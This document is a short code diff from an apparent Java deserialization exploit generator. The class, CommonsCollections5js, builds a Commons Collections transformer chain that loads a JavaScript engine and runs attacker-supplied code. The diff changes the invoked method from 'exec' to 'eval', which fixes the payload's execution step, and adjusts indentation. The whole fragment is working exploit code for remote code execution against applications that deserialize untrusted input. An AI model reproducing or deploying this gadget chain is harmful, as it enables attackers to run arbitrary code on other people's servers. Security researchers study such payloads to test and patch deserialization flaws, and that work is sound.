@@ -59,8 +59,8 @@ public class CommonsCollections5js extends PayloadRunner implements ObjectPayloa
 				new ConstantTransformer(javax.script.ScriptEngineManager.class),
                 new InvokerTransformer("newInstance", null, null),  // 使用 newInstance 创建实例
                 new InvokerTransformer("getEngineByName",
-                new Class[] { String.class }, new String[]{"JavaScript"}),
-				new InvokerTransformer("exec",
+                    new Class[] { String.class }, new String[]{"JavaScript"}),
+				new InvokerTransformer("eval",
 					new Class[] { String.class }, execArgs),
 				new ConstantTransformer(1) };
 
